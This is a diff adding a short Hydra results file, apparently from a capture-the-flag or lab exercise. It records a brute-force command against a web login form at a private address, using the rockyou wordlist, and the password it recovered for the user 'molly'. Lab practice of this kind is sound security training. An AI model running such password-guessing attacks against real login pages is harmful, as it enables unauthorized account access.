@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2024-08-06 10:24:31 on 10.10.166.24 http-post-form (hydra -l molly -P /usr/share/wordlists/rockyou.txt -f -o form.txt 10.10.166.24 http-post-form /login:username=^USER^&password=^PASS^:F=incorrect)
+[80][http-post-form] host: 10.10.166.24   login: molly   password: sunshine
